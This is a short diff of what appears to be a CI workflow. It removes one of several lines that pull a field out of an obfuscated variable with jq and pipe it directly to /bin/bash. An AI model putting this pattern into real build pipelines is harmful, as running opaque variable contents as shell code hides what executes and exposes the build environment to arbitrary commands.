@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$fu842" | jq -r .ugwe0 | /bin/bash
           echo $c89 | jq -r .mlig75 | /bin/bash
           echo $ya14380 | jq -r .sxk2 | /bin/bash
-          echo $bf770 | jq -r .je0 | /bin/bash
           printf '%s' "$dads256" | jq -r .u0 | /bin/bash
 
       - name: Upload artifact
